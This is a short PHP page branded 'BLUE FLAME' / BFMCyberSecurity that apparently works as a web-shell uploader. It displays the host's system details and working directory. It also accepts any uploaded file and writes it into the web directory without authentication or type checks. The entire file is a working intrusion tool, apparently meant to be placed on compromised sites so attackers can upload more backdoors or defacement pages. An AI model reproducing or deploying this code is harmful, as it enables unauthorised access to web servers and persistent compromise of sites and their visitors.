<html>
<title> BFMCyberSecurity </title>
<center>
	<h1> BLUE FLAME </h1>
<?php echo '<b>System Info:</b> '.php_uname().'<br>'.'<b>Current Directory:</b> '.getcwd();echo '<br><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="20"><input name="_upl" type="submit" id="_upl" value="Uploaded"></form></td></tr></table></pre>';if($_FILES){if(!empty($_FILES['file'])){move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);echo "<b>File Uploaded !!!</b><br>";}else{echo "<b>Upload Failed !!!</b><br><br>";}}?>
